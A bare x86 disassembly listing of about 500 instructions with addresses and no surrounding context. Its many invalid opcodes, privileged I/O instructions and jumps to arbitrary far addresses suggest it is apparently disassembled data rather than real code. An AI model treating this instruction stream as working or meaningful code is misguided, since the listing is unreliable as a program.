  4037ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ee:	xchg   edx,eax
  4037ef:	cwde   
  4037f0:	icebp  
  4037f1:	mov    cl,0xf6
  4037f3:	mov    eax,ds:0xb1d7bb0b
  4037f8:	inc    ebp
  4037f9:	das    
  4037fa:	popf   
  4037fb:	xor    al,BYTE PTR [ecx+0x55df3662]
  403801:	jmp    0xbf68:0x6772df81
  403808:	inc    ebp
  403809:	das    
  40380a:	pop    edx
  40380b:	sbb    cl,bl
  40380d:	inc    edx
  40380e:	lds    eax,FWORD PTR [edi]
  403810:	jne    0x403830
  403812:	xchg   BYTE PTR [edi+0x6d],dl
  403815:	mov    bh,0xc4
  403817:	(bad)  
  403818:	shl    DWORD PTR [eax],0x7a
  40381b:	test   al,0x42
  40381d:	jo     0x403824
  40381f:	in     al,dx
  403820:	mov    edx,0xb2c1c1f3
  403825:	pop    eax
  403826:	test   DWORD PTR [esi-0x3296efec],ecx
  40382c:	and    DWORD PTR [ecx-0x76],edx
  40382f:	rol    DWORD PTR [ebx-0x14],cl
  403832:	push   ss
  403833:	clc    
  403834:	or     esi,edi
  403836:	lea    ebp,[ebx]
  403838:	jl     0x40386a
  40383a:	or     al,0xa4
  40383c:	inc    ecx
  40383d:	mov    eax,0x6a7fb76d
  403842:	imul   DWORD PTR ds:0x655ec4a4
  403848:	xor    eax,0xc598065c
  40384d:	sbb    eax,DWORD PTR [eax+eiz*2-0x4c16daad]
  403854:	int3   
  403855:	sbb    al,0xee
  403857:	push   esi
  403858:	(bad)  
  403859:	leave  
  40385a:	add    BYTE PTR [esp+esi*1],dl
  40385d:	xor    al,0xe0
  40385f:	scas   al,BYTE PTR es:[edi]
  403860:	push   ss
  403861:	jns    0x4037ea
  403863:	scas   al,BYTE PTR es:[edi]
  403864:	dec    eax
  403865:	mov    dl,0x6f
  403867:	xor    al,0x9c
  403869:	xor    al,0x9b
  40386b:	aad    0xb3
  40386d:	pop    esi
  40386e:	pop    ss
  40386f:	dec    ecx
  403870:	jmp    FWORD PTR [ebx]
  403872:	not    DWORD PTR [ebp+edx*4+0x56]
  403876:	sub    BYTE PTR [ecx-0x5792d41c],0x19
  40387d:	mov    bh,0xa4
  40387f:	pop    esi
  403880:	ficomp WORD PTR [ecx]
  403882:	inc    BYTE PTR fs:[eax]
  403885:	cld    
  403886:	xchg   edi,eax
  403887:	add    ecx,DWORD PTR [ebp+0x5d]
  40388a:	clc    
  40388b:	mov    al,ds:0x5c050e8e
  403890:	mov    ds:0xdd4e8097,eax
  403895:	inc    esi
  403896:	sbb    BYTE PTR ds:0x3b0971e5,dh
  40389c:	sbb    cl,dh
  40389e:	mov    eax,ds:0x7be8e1fb
  4038a3:	test   DWORD PTR [edi+0x44],edi
  4038a6:	push   ebp
  4038a7:	fsubr  DWORD PTR [ebx]
  4038a9:	fnsave [ecx+ebp*1]
  4038ac:	fnstsw WORD PTR [edx+0x60]
  4038af:	push   ecx
  4038b0:	sbb    BYTE PTR [ecx+0x41],dh
  4038b3:	cmp    al,0x28
  4038b5:	mov    ds:0xc630e7ad,al
  4038ba:	mov    ds:0x2fb7584,al
  4038bf:	shl    DWORD PTR [edx+0x8faf8a],0x3a
  4038c6:	rol    BYTE PTR [edx-0x4f7b40f8],1
  4038cc:	lods   eax,DWORD PTR ds:[esi]
  4038cd:	mov    edx,0x7d0c0df9
  4038d2:	ja     0x40389a
  4038d4:	and    DWORD PTR [esi+0x47],ecx
  4038d7:	hlt    
  4038d8:	cwde   
  4038d9:	adc    eax,0x7017fcf7
  4038de:	xchg   ecx,eax
  4038df:	cwde   
  4038e0:	out    0x82,al
  4038e2:	jns    0x4038f8
  4038e4:	mov    bl,0x28
  4038e6:	sub    BYTE PTR [ebx-0x54e56b4e],0x8d
  4038ed:	and    DWORD PTR [edi+0x2a825d9b],0x8ee95481
  4038f7:	jmp    0xf1eefdcc
  4038fc:	push   esp
  4038fd:	dec    edi
  4038fe:	(bad)  
  4038ff:	or     ch,BYTE PTR [ecx+0x2]
  403902:	mov    ecx,0x41b56a5
  403907:	imul   eax,DWORD PTR [ebx+0x1cb1426d],0x592ee13f
  403911:	mov    es,edi
  403913:	and    ah,BYTE PTR [ebp+0x386fac35]
  403919:	mov    ds:0x12941a0e,al
  40391e:	pop    ss
  40391f:	ret    
  403920:	mov    BYTE PTR [ecx-0x5b3bd9d2],bh
  403926:	adc    eax,0x8812dc9e
  40392b:	scas   al,BYTE PTR es:[edi]
  40392c:	xchg   esi,eax
  40392d:	cwde   
  40392e:	jmp    0xbeb79fd0
  403933:	ret    0x379e
  403936:	sub    DWORD PTR [ecx-0x4968c59b],edx
  40393c:	sbb    dh,BYTE PTR fs:[ebx]
  40393f:	dec    edi
  403940:	call   0x3d77:0x3ccdf9d4
  403947:	push   ds
  403948:	dec    eax
  403949:	xor    al,0x4b
  40394b:	add    eax,DWORD PTR [edi]
  40394d:	inc    ebp
  40394e:	pop    DWORD PTR [edx]
  403950:	sub    DWORD PTR [esi-0x3f],esp
  403953:	repz ds jno 0x4039c0
  403957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403958:	rol    DWORD PTR [edi+0x3d],0x83
  40395c:	or     al,0x2f
  40395e:	ins    DWORD PTR es:[edi],dx
  40395f:	xor    BYTE PTR [ebx+0xa],ch
  403962:	call   0x875630d
  403967:	mov    eax,ds:0xb98b1d24
  40396c:	shr    BYTE PTR [eax-0xd0e3f8],1
  403972:	jl     0x403965
  403974:	mov    edi,0x2cbc01d
  403979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40397a:	loopne 0x4039d6
  40397c:	out    0xfc,eax
  40397e:	sub    al,0x1
  403980:	stos   BYTE PTR es:[edi],al
  403981:	mov    esi,0xdfa0b94d
  403986:	ins    BYTE PTR es:[edi],dx
  403987:	pop    edx
  403988:	xchg   edx,eax
  403989:	(bad)  
  40398a:	stc    
  40398b:	mov    WORD PTR [esi],?
  40398d:	dec    DWORD PTR [edx+0x3]
  403990:	xchg   ebp,eax
  403991:	dec    esp
  403992:	adc    DWORD PTR [edx+edi*8],esi
  403995:	inc    ebp
  403996:	scas   eax,DWORD PTR es:[edi]
  403997:	hlt    
  403998:	jge    0x403962
  40399a:	sub    BYTE PTR [ebx-0x40],ah
  40399d:	push   ecx
  40399e:	jle    0x403a11
  4039a0:	mov    ds:0x14e25db2,al
  4039a5:	inc    ecx
  4039a6:	jb     0x40397d
  4039a8:	imul   esp,DWORD PTR [edx-0x7977bb6e],0xc9c0caf8
  4039b2:	test   BYTE PTR [ebx+0x63f93329],0x89
  4039b9:	clc    
  4039ba:	sbb    al,0x27
  4039bc:	shr    DWORD PTR [edx-0x2b24f04f],cl
  4039c2:	test   eax,0xf8231d3
  4039c7:	jge    0x40394a
  4039c9:	pop    edx
  4039ca:	add    edx,DWORD PTR [edi+0x345388ec]
  4039d0:	lods   eax,DWORD PTR ds:[esi]
  4039d1:	sub    BYTE PTR [esi-0x58],ch
  4039d4:	cmp    al,bl
  4039d6:	cmp    esi,DWORD PTR [ebx+eax*2+0x61]
  4039da:	mov    ch,0x3e
  4039dc:	lock or BYTE PTR [edi],cl
  4039df:	sub    DWORD PTR [edi+0x4ccaa298],edi
  4039e5:	shl    DWORD PTR [edi-0x388f2fca],1
  4039eb:	in     al,dx
  4039ec:	mov    bh,0x13
  4039ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039ef:	jb     0x4039dc
  4039f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039f2:	call   0xfb92b24c
  4039f7:	jb     0x403a0d
  4039f9:	add    al,0xb1
  4039fb:	or     al,0x4
  4039fd:	in     al,dx
  4039fe:	push   ds
  4039ff:	mov    edi,0x5fb2b59d
  403a04:	in     al,dx
  403a05:	jo     0x403a4c
  403a07:	mov    DWORD PTR [edx+0x4a],eax
  403a0a:	sbb    BYTE PTR [esi-0x29eaedc8],0x4d
  403a11:	xor    DWORD PTR [esi-0x3170dcf0],0xffffff92
  403a18:	cmc    
  403a19:	test   BYTE PTR ds:[ebx],0x22
  403a1d:	mov    edi,0x1e6656cd
  403a22:	in     al,dx
  403a23:	scas   eax,DWORD PTR es:[edi]
  403a24:	lods   eax,DWORD PTR ds:[esi]
  403a25:	pop    edx
  403a26:	imul   eax,DWORD PTR [ecx+0x24],0x609ad691
  403a2d:	cmp    eax,0x762e1e78
  403a32:	scas   eax,DWORD PTR es:[edi]
  403a33:	aaa    
  403a34:	add    DWORD PTR [edx+0x42],0xffffffa4
  403a38:	sub    ebp,eax
  403a3a:	xor    al,0x39
  403a3c:	adc    ecx,DWORD PTR [eax]
  403a3e:	ds ret 0xb191
  403a42:	dec    ebx
  403a43:	cmp    eax,0x643e5251
  403a48:	fadd   DWORD PTR [edi]
  403a4a:	pop    edi
  403a4b:	mov    cl,0xa8
  403a4d:	push   ebx
  403a4e:	ror    BYTE PTR [eax-0x7ab22425],0x2d
  403a55:	inc    esp
  403a56:	dec    ebx
  403a57:	xrelease mov DWORD PTR ds:[edx-0xa],ecx
  403a5c:	dec    esp
  403a5d:	cld    
  403a5e:	(bad)  
  403a5f:	and    ebx,DWORD PTR [edi-0x6e8f165b]
  403a65:	sub    ah,cl
  403a67:	push   ss
  403a68:	loop   0x403a46
  403a6a:	add    al,al
  403a6c:	and    BYTE PTR [ecx],0x32
  403a6f:	scas   al,BYTE PTR es:[edi]
  403a70:	xlat   BYTE PTR ds:[ebx]
  403a71:	pusha  
  403a72:	cdq    
  403a73:	(bad)  
  403a75:	loop   0x403a22
  403a77:	jno    0x403a3c
  403a79:	adc    esp,esp
  403a7b:	pop    ebp
  403a7c:	cmp    al,0x26
  403a7e:	(bad)  
  403a7f:	call   0x9f67123f
  403a84:	xor    bh,BYTE PTR [edx+ebx*1]
  403a87:	ret    
  403a88:	add    al,0x91
  403a8a:	mov    ah,BYTE PTR [ecx+edi*8+0x3b]
  403a8e:	adc    al,0x20
  403a90:	pushf  
  403a91:	sti    
  403a92:	call   0x8e35f745
  403a97:	pop    ebp
  403a98:	out    0xf,al
  403a9a:	mov    esi,0xc1d5d12
  403a9f:	in     eax,dx
  403aa0:	jmp    0x39b69ce5
  403aa5:	mov    ch,0x7a
  403aa7:	bnd jbe 0x403a3d
  403aaa:	rcr    DWORD PTR [ecx],0x2c
  403aad:	add    al,0x58
  403aaf:	inc    ebx
  403ab0:	add    bl,bl
  403ab2:	mov    ecx,0xae2a2a49
  403ab7:	rcl    DWORD PTR [ecx],cl
  403ab9:	hlt    
  403aba:	mov    al,ds:0x684200c5
  403abf:	int3   
  403ac0:	cdq    
  403ac1:	pushf  
  403ac2:	stc    
  403ac3:	push   esi
  403ac4:	cld    
  403ac5:	add    eax,0x621ac7ce
  403aca:	ret    
  403acb:	fld    TBYTE PTR ds:0x3412caa5
  403ad1:	pusha  
  403ad2:	and    eax,0xd37d742d
  403ad7:	in     eax,dx
  403ad8:	ror    ebp,1
  403ada:	inc    esi
  403adb:	sbb    al,0xfc
  403add:	sbb    BYTE PTR [ebp-0x7904ed6b],ah
  403ae3:	cmp    dh,dh
  403ae5:	xchg   ebp,eax
  403ae6:	add    eax,0x87c978c0
  403aeb:	es hlt 
  403aed:	scas   al,BYTE PTR es:[edi]
  403aee:	fwait
  403aef:	add    esi,ecx
  403af1:	lds    ebx,FWORD PTR [ecx-0x58da3e7]
  403af7:	test   al,0xdc
  403af9:	xchg   edi,eax
  403afa:	lds    eax,FWORD PTR [edi]
  403afc:	pop    ebx
  403afd:	push   esp
  403afe:	(bad)  
  403aff:	dec    edx
  403b01:	dec    esi
  403b02:	inc    esp
  403b03:	or     bh,dl
  403b05:	push   esp
  403b06:	cmp    BYTE PTR [ecx+0x6],dh
  403b09:	in     al,dx
  403b0a:	sub    ebp,DWORD PTR [esi-0x2d]
  403b0d:	in     eax,dx
  403b0e:	add    dh,bh
  403b10:	rcl    DWORD PTR [esp+ebx*1-0x6e8e8373],0x87
  403b18:	(bad)  
  403b19:	and    BYTE PTR [ebp+0x78],cl
  403b1c:	dec    edi
  403b1d:	cmp    DWORD PTR [ebx-0x6cf377db],esp
  403b23:	lock cmp esi,DWORD PTR ds:0xefaf18e
  403b2a:	pushf  
  403b2b:	fnstcw WORD PTR ss:[eax-0x6aca6f6f]
  403b32:	into   
  403b33:	cmp    al,0xc5
  403b35:	stos   DWORD PTR es:[edi],eax
  403b36:	push   es
  403b37:	xlat   BYTE PTR ds:[ebx]
  403b38:	daa    
  403b39:	or     DWORD PTR [edx],0x7e723c47
  403b3f:	push   es
  403b40:	add    DWORD PTR [ebp+0x3d],ebp
  403b43:	xchg   edi,eax
  403b44:	add    eax,0x618aacf9
  403b49:	imul   esp,DWORD PTR [esi+0x61],0xa439bb1a
  403b50:	cmp    DWORD PTR ds:0x35886e52,eax
  403b56:	lock push edi
  403b59:	stc    
  403b5a:	sub    al,0x30
  403b5c:	stos   BYTE PTR es:[edi],al
  403b5d:	xchg   edi,eax
  403b5e:	arpl   WORD PTR [eax-0x33],sp
  403b61:	sti    
  403b62:	jno    0x403b98
  403b64:	enter  0xc939,0xf7
  403b68:	test   BYTE PTR [edx-0x1],ch
  403b6b:	push   ecx
  403b6c:	add    al,0x7a
  403b6e:	lds    ecx,FWORD PTR [edx-0x49f279f0]
  403b74:	ja     0x403b90
  403b76:	fsub   QWORD PTR [edx-0x7838a80d]
  403b7c:	pushf  
  403b7d:	dec    eax
  403b7e:	ja     0x403b6b
  403b80:	pop    edx
  403b81:	out    0x67,al
  403b83:	lock or dl,al
  403b86:	in     eax,0x41
  403b88:	mov    ?,WORD PTR [esi+0x45ba0ccf]
  403b8e:	outs   dx,DWORD PTR ds:[esi]
  403b8f:	mov    edx,0x63a165b7
  403b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b95:	adc    al,0xd7
  403b97:	(bad)  
  403b98:	div    BYTE PTR [ecx-0x54d93235]
  403b9e:	adc    DWORD PTR [ecx+0x77],0x2e
  403ba2:	or     al,BYTE PTR [ecx-0x1e]
  403ba5:	ss inc ecx
  403ba7:	ins    BYTE PTR es:[edi],dx
  403ba8:	jae    0x403b85
  403baa:	enter  0xbb77,0x10
  403bae:	rol    DWORD PTR [eax+0x45ae16e5],0x1e
  403bb5:	retf   
  403bb6:	push   eax
  403bb7:	or     esp,DWORD PTR fs:[ecx-0x366238c7]
  403bbe:	adc    al,0x24
  403bc0:	aas    
  403bc1:	mov    WORD PTR [ecx+0x4d691956],ss
  403bc7:	daa    
  403bc8:	and    eax,DWORD PTR [edi+0x3d514eb8]
  403bce:	lds    ebx,FWORD PTR [esi]
  403bd0:	imul   eax,DWORD PTR [edi+edi*2+0x13629993],0x5ff979fe
  403bdb:	ja     0x403bd1
  403bdd:	cmp    dl,al
  403bdf:	leave  
  403be0:	xor    al,0x34
  403be2:	in     eax,dx
  403be3:	cdq    
  403be4:	(bad)  
  403be5:	data16 mov dh,0x57
  403be8:	mov    WORD PTR [edx+0x734dfc0],es
  403bee:	aad    0x71
  403bf0:	cmp    al,0xea
  403bf2:	xor    al,0xc7
  403bf4:	pop    ebp
  403bf5:	imul   edi,DWORD PTR [ebp+0x40644eb3],0xffffffa8
  403bfc:	(bad)  
  403bfd:	pop    ebx
  403bfe:	lahf   
  403bff:	cmp    edi,DWORD PTR [eax+0x29]
  403c02:	add    bh,BYTE PTR [esi]
  403c04:	cmc    
  403c05:	iret   
  403c06:	jmp    0x403b9e
  403c08:	mov    ebx,0xe668dd44
  403c0d:	push   ecx
  403c0e:	mov    ebx,0x11529af0
  403c13:	cmp    DWORD PTR [esi+0x1abcad49],ecx
  403c19:	stc    
  403c1a:	enter  0x1904,0x8a
  403c1e:	(bad)  
  403c1f:	and    eax,0x50bf011e
  403c24:	jno    0x403ca2
  403c26:	or     BYTE PTR [edx],dh
  403c28:	sub    ebx,DWORD PTR ds:0xe17888f
  403c2e:	xchg   ebx,eax
  403c2f:	das    
  403c30:	inc    esp
  403c31:	ror    al,0x9a
  403c34:	xchg   edx,eax
  403c35:	(bad)  
  403c36:	dec    edi
  403c37:	sbb    bh,ch
  403c39:	ror    DWORD PTR ss:0x9ff4371,cl
  403c40:	aaa    
  403c41:	sbb    eax,0xa4dd5b3a
  403c46:	mov    bl,0xed
  403c48:	mov    ch,0xb9
  403c4a:	inc    eax
  403c4b:	cmp    al,0xb3
  403c4d:	iret   
  403c4e:	pop    ecx
  403c4f:	std    
  403c50:	js     0x403c2a
  403c52:	cmp    bh,BYTE PTR [esi-0x71]
  403c55:	inc    esp
  403c56:	loop   0x403cc6
  403c58:	mov    gs,ebx
  403c5a:	in     eax,dx
  403c5b:	nop
  403c5c:	xchg   ebp,eax
  403c5d:	call   0xac8e:0xdd532bdf
  403c64:	mov    ds:0x60ec1c9e,al
  403c69:	pop    ss
  403c6a:	push   esi
  403c6b:	sbb    al,0x95
  403c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c6f:	cmp    DWORD PTR [esi],ebx
  403c71:	test   BYTE PTR [ecx-0x7b],cl
  403c74:	jp     0x403c18
  403c76:	fiadd  DWORD PTR [edx-0x5ad7f258]
  403c7c:	clc    
  403c7d:	iret   
  403c7e:	stc    
  403c7f:	fs xor ecx,esi
  403c82:	adc    DWORD PTR [ebx+0x3e],ebx
  403c85:	pop    ss
  403c86:	inc    ebx
  403c87:	mov    eax,cs
  403c89:	fsubr  QWORD PTR [ecx-0x666037ea]
  403c8f:	jo     0x403c1e
  403c91:	loope  0x403c14
  403c93:	nop
  403c94:	aaa    
  403c95:	leave  
  403c96:	mov    al,ds:0x40b25f91
  403c9b:	pop    eax
  403c9c:	pop    edi
  403c9d:	jmp    0xc2de2291
  403ca2:	jmp    0x18991eb2
  403ca7:	(bad)  
  403ca8:	sub    eax,ebp
  403caa:	pop    esp
  403cab:	dec    ebp
  403cac:	out    dx,eax
  403cad:	sbb    BYTE PTR [edi-0xf6e3105],dl
  403cb3:	sbb    BYTE PTR [ebp+0x2d],dl
  403cb6:	sub    esi,DWORD PTR [eax]
  403cb8:	jg     0x403c47
  403cba:	cld    
  403cbb:	dec    esp
  403cbc:	fistp  QWORD PTR [ebx-0x17399005]
  403cc2:	idiv   eax
  403cc4:	add    al,0x24
  403cc6:	mov    al,0x51
  403cc8:	or     edi,eax
  403cca:	mov    ebx,0x1a61adc8
  403ccf:	xor    bh,ah
  403cd1:	pop    eax
  403cd2:	mov    esp,0x2c90135e
  403cd7:	stos   DWORD PTR es:[edi],eax
  403cd8:	ret    
  403cd9:	add    ch,al
  403cdb:	int    0x5a
  403cdd:	cli    
  403cde:	adc    DWORD PTR [ebx-0x3255342e],ebx
  403ce4:	mov    cs,WORD PTR [eax-0x1d]
  403ce7:	mov    esi,0x24254c8f
  403cec:	cmp    eax,0xba9eb280
  403cf1:	out    0xe7,al
  403cf3:	mov    ch,0xc6
  403cf5:	inc    esi
  403cf6:	adc    al,0x38
  403cf8:	add    ah,BYTE PTR [eax-0x2e]
  403cfb:	bound  esi,QWORD PTR [eax]
  403cfd:	dec    esi
  403cfe:	adc    BYTE PTR [edi],al
  403d00:	jns    0x403d53
  403d02:	inc    edi
  403d03:	push   ss
  403d04:	lds    ecx,FWORD PTR [ebp-0x57]
  403d07:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d09:	dec    edx
  403d0a:	mov    edi,0xc2946c39
  403d0f:	das    
  403d10:	dec    edi
  403d11:	jb     0x403d81
  403d13:	push   ebx
  403d14:	adc    ebp,DWORD PTR [esi]
  403d16:	test   DWORD PTR [esp+eax*2+0x71318f7c],esi
  403d1d:	int    0x29
  403d1f:	dec    esi
  403d20:	mov    dl,0x22
  403d22:	or     bl,dl
  403d24:	inc    eax
  403d25:	or     BYTE PTR [eax+esi*2-0x57],bl
  403d29:	sub    eax,0xfd9b9a5d
  403d2e:	(bad)  
  403d30:	adc    edx,ecx
  403d32:	(bad)  
  403d33:	(bad)  
  403d34:	outs   dx,BYTE PTR ds:[esi]
  403d35:	repz test eax,0xa934f933
  403d3b:	lahf   
  403d3c:	inc    ebx
  403d3d:	cs add eax,eax
  403d40:	cmp    dl,BYTE PTR [ecx+0x6a106ae]
  403d46:	push   DWORD PTR [ebx-0x6]
  403d49:	or     esp,ecx
  403d4b:	pop    eax
  403d4c:	mov    dl,0xc8
  403d4e:	sub    edx,edx
  403d50:	jnp    0x403d04
  403d52:	jmp    0xd9a0:0x487465e
  403d59:	dec    ebp
  403d5a:	cmovs  ebx,DWORD PTR [ecx]
  403d5d:	pop    ebp
  403d5e:	les    edi,FWORD PTR [esi-0x26]
  403d61:	sbb    DWORD PTR [ebx+esi*8],ecx
  403d64:	add    cl,bh
  403d66:	or     eax,0xe798c7e6
  403d6b:	adc    al,0xda
  403d6d:	lea    ecx,[ebp*8+0x32ee952d]
  403d74:	aad    0x64
  403d76:	mov    esp,DWORD PTR [ebp-0x33]
  403d79:	and    bl,BYTE PTR [edi]
  403d7b:	push   es
  403d7c:	add    al,BYTE PTR [ebp*1-0x64d1c875]
  403d83:	jne    0x403d13
  403d85:	pop    ebx
  403d86:	hlt    
  403d87:	ficom  DWORD PTR [edi+0x2e2b17c0]
  403d8d:	push   es
  403d8e:	pop    esi
  403d8f:	cld    
  403d90:	in     al,dx
  403d91:	loope  0x403d8c
  403d93:	arpl   WORD PTR [esi+0x15],dx
  403d96:	shl    BYTE PTR [ecx+0x2523a673],cl
  403d9c:	ins    BYTE PTR es:[edi],dx
  403d9d:	pusha  
  403d9e:	ret    0xfb14
  403da1:	jnp    0x403d7a
  403da3:	aad    0x5b
  403da5:	add    eax,0xdff6c1d2
  403daa:	jmp    0x774d6690
  403daf:	push   esi
  403db0:	out    dx,al
  403db1:	mov    ch,0x25
  403db3:	cmp    edx,0xea77c693
  403db9:	xor    BYTE PTR [edx],cl
  403dbb:	mov    dh,0x23
  403dbd:	imul   ebp,DWORD PTR [edx],0x2dd64334
  403dc3:	mov    BYTE PTR [ecx],dh
  403dc5:	xchg   esi,eax
  403dc6:	sub    dl,BYTE PTR [esi-0x6f1dc2c5]
  403dcc:	or     DWORD PTR [ebx+ebx*2-0x4d],edx
  403dd0:	clc    
  403dd1:	js     0x403db8
  403dd3:	jge    0x403d66
  403dd5:	or     eax,0x98f8d857
  403dda:	inc    ebx
  403ddb:	nop
  403ddc:	xor    bh,ah
  403dde:	jmp    0x403db2
  403de0:	mov    dh,0x6
  403de2:	lea    edi,fs:[edi]
  403de5:	stos   BYTE PTR es:[edi],al
  403de6:	daa    
  403de7:	in     eax,dx
  403de8:	jo     0x403e21
  403dea:	sub    cl,BYTE PTR [edi+0x5d4a97]
  403df0:	fcmovnbe st,st(3)
  403df2:	mov    ecx,DWORD PTR [ecx+0x5ed04d4e]
  403df8:	bound  edi,QWORD PTR [ebx-0x419c8249]
  403dfe:	dec    esi
  403dff:	pop    edi
  403e00:	test   BYTE PTR [esi+eiz*4+0x4c908fce],0xcb
  403e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e09:	fistp  QWORD PTR [edx+0x3d]
  403e0c:	lahf   
  403e0d:	and    ecx,esp
  403e0f:	sub    dl,cl
  403e11:	lods   eax,DWORD PTR ds:[esi]
  403e12:	dec    esi
  403e13:	lods   al,BYTE PTR ds:[esi]
  403e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e15:	mov    bl,0x40
  403e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e18:	bound  edx,QWORD PTR [edx]
  403e1a:	sbb    eax,0xca73d492
  403e1f:	fsub   QWORD PTR [esi]
  403e21:	mov    ch,BYTE PTR [ebp-0x6f615fcd]
  403e27:	and    DWORD PTR [edi+0x36b9f5dd],0xb7671487
  403e31:	shr    BYTE PTR [ecx-0x9],1
  403e34:	ins    BYTE PTR es:[edi],dx
  403e35:	ja     0x403dd4
  403e37:	push   edi
  403e38:	push   ebx
  403e39:	and    DWORD PTR [ecx+0x68],edi
  403e3c:	dec    esi
  403e3d:	out    dx,al
  403e3e:	idiv   DWORD PTR [edx+0x52ed4c95]
  403e44:	es sbb dl,cl
  403e47:	hlt    
  403e48:	call   0xaf554861
  403e4d:	push   esi
  403e4e:	add    edi,DWORD PTR [ecx-0x7f3ae7d2]
  403e54:	pop    ebx
  403e55:	hlt    
  403e56:	and    BYTE PTR [eax+0x49817e62],ch
  403e5c:	jle    0x403df8
  403e5e:	fimul  WORD PTR [edx]
  403e60:	call   0x2cec:0x13d31d7c
  403e67:	cwde   
  403e68:	push   0x3d
  403e6a:	add    eax,0x31e8530a
  403e6f:	mov    edi,0xc43793a1
  403e74:	(bad)  
  403e75:	or     al,0x45
  403e77:	mov    edi,0x754b6db1
  403e7c:	pop    esi
  403e7d:	gs iret 
  403e7f:	jno    0x403ec0
  403e81:	mov    esp,0x66169422
  403e86:	pusha  
  403e87:	clc    
  403e88:	xchg   edi,eax
  403e89:	mov    al,0xde
  403e8b:	mov    ebx,0xe2200df
  403e90:	pop    es
  403e91:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  403e93:	ret    0x5366
  403e96:	adc    ah,BYTE PTR [ebx-0x76]
  403e99:	ror    DWORD PTR [ecx],0x4e
  403e9c:	bound  ebx,QWORD PTR [eax+0x7f]
  403e9f:	xchg   edx,eax
  403ea0:	gs (bad) 
  403ea2:	mov    ecx,0x833cf83b
  403ea7:	(bad)  
  403ea9:	out    dx,al
  403eaa:	(bad)  
  403eab:	(bad)  
  403eac:	push   esp
  403ead:	cmp    DWORD PTR [edi+eax*4],0xd6774926
  403eb4:	rcr    DWORD PTR [ebx+0x609e1ddb],0xd
  403ebb:	out    0x1d,eax
  403ebd:	push   esp
  403ebe:	dec    ecx
  403ebf:	repz fisttp WORD PTR [ebp-0x6e06eb42]
  403ec6:	mov    ah,0x6b
  403ec8:	mov    eax,0xb8112c6f
  403ecd:	mov    ds:0x5c9b2ee2,al
  403ed2:	fisttp QWORD PTR [ecx]
  403ed4:	xchg   DWORD PTR [esi-0x7603effd],edi
  403eda:	out    0x55,eax
  403edc:	cwde   
  403edd:	sbb    DWORD PTR [esi-0x41],ebx
  403ee0:	sbb    DWORD PTR [ebx+0x64],edi
  403ee3:	jp     0x403ed5
  403ee5:	sub    eax,0x63aaa754
  403eea:	adc    eax,0x6fc28669
  403eef:	lods   eax,DWORD PTR ds:[esi]
  403ef0:	mov    ecx,DWORD PTR [edx+0x4a894327]
  403ef6:	jnp    0x403f62
  403ef8:	xor    al,0xcf
  403efa:	(bad)  
  403efb:	jecxz  0x403f0e
  403efd:	mov    ah,0x63
  403eff:	idiv   eax
  403f01:	fsubr  st(4),st
  403f03:	lahf   
  403f04:	dec    eax
  403f05:	(bad)  [edi-0x6c1c9e61]
  403f0b:	cmp    ebx,DWORD PTR [edx-0x33]
  403f0e:	ror    DWORD PTR [ebx-0xa],cl
  403f11:	xor    cl,BYTE PTR [eax]
  403f13:	inc    esp
  403f14:	jb     0x403eaa
  403f16:	sub    al,0x8b
  403f18:	inc    ecx
  403f19:	push   cs
  403f1a:	xchg   ebp,eax
  403f1b:	inc    BYTE PTR [ebx+0x3604ce7a]
  403f21:	push   ecx
  403f22:	pop    esp
  403f23:	loope  0x403ea7
  403f25:	sbb    eax,0xcbea6f1e
  403f2a:	mov    cl,0xe9
  403f2c:	push   edx
  403f2d:	fidivr WORD PTR es:[esi-0x44]
  403f31:	and    eax,0xab63a2f4
  403f36:	lds    edi,FWORD PTR [ebx-0x6f]
  403f39:	ss cmp ax,0x2efd
  403f3e:	call   0x6745d999
  403f43:	jo     0x403ec5
  403f45:	push   ebx
  403f46:	sahf   
  403f47:	lods   eax,DWORD PTR ds:[esi]
  403f48:	add    ebx,DWORD PTR [edi-0x1a728d2e]
  403f4e:	(bad)  
  403f4f:	mov    eax,ds:0xaf8c67bf
  403f54:	add    cl,bl
  403f56:	xor    ebp,DWORD PTR [eax]
  403f58:	adc    eax,0x2561d5bc
  403f5d:	xchg   edi,esp
  403f5f:	push   DWORD PTR ds:0xf9bea41b
  403f65:	jbe    0x403fa3
  403f67:	push   eax
  403f68:	jb     0x403f21
  403f6a:	cmp    cl,BYTE PTR [ecx]
  403f6c:	or     BYTE PTR [ebp-0x2b],dh
  403f6f:	hlt    
  403f70:	pop    ebp
  403f71:	mov    ecx,0xd1a7b72f
  403f76:	pushf  
  403f77:	sbb    al,0x30
  403f79:	jmp    FWORD PTR ds:0x6e9c6a50
  403f7f:	cwde   
  403f80:	cmp    ebx,DWORD PTR [esi+0x33f578b5]
  403f86:	jae    0x403ff2
  403f88:	je     0x403f1e
  403f8a:	test   BYTE PTR [ebx-0x23],ch
  403f8d:	lods   al,BYTE PTR ds:[esi]
  403f8e:	sbb    esi,DWORD PTR [edi]
  403f90:	sbb    eax,0x80a72379
  403f95:	lods   al,BYTE PTR ds:[esi]
  403f96:	jg     0x404015
  403f98:	xchg   BYTE PTR [edx],dl
  403f9a:	cmp    al,0xe0
  403f9c:	jg     0x403fef
  403f9e:	inc    ecx
  403f9f:	push   es
  403fa0:	clc    
  403fa1:	push   esp
  403fa2:	add    ebp,DWORD PTR ss:[ebx]
  403fa5:	jl     0x403f85
  403fa7:	je     0x403f97
  403fa9:	inc    edx
  403faa:	add    ch,BYTE PTR [ecx+0x72758e70]
  403fb0:	inc    edi
  403fb1:	leave  
  403fb2:	adc    DWORD PTR [ebp+0x3e309588],0x8201ebfd
  403fbc:	xchg   esi,eax
  403fbd:	lock clc 
  403fbf:	sbb    al,0x2
  403fc1:	xchg   BYTE PTR [eax],bl
  403fc3:	jae    0x404019
